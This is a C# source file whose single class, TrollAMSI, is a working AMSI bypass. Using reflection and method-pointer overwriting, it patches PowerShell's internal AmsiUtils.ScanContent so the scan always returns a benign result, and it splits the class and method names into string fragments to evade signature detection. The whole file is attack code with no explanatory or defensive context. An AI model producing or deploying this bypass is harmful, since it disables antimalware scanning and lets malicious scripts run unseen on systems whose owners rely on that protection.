using System;
using System.Management.Automation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

public static class TrollAMSI
{
    public static void troll()
    {
        MethodInfo o = typeof(PSObject).Assembly.GetType("System.Management.Automation.Am" + "si" + "U" + "tils").GetMethod("Sca" + "nC" + "ontent", BindingFlags.Static | BindingFlags.NonPublic);
        MethodInfo t = typeof(TrollAMSI).GetMethod("M", BindingFlags.Static | BindingFlags.NonPublic);
        RuntimeHelpers.PrepareMethod(o.MethodHandle);
        RuntimeHelpers.PrepareMethod(t.MethodHandle);
        Marshal.Copy(new IntPtr[] { Marshal.ReadIntPtr(t.MethodHandle.Value + 8) }, 0, o.MethodHandle.Value + 8, 1);
    }
    private static int M(string c, string s) { return 1; }
}
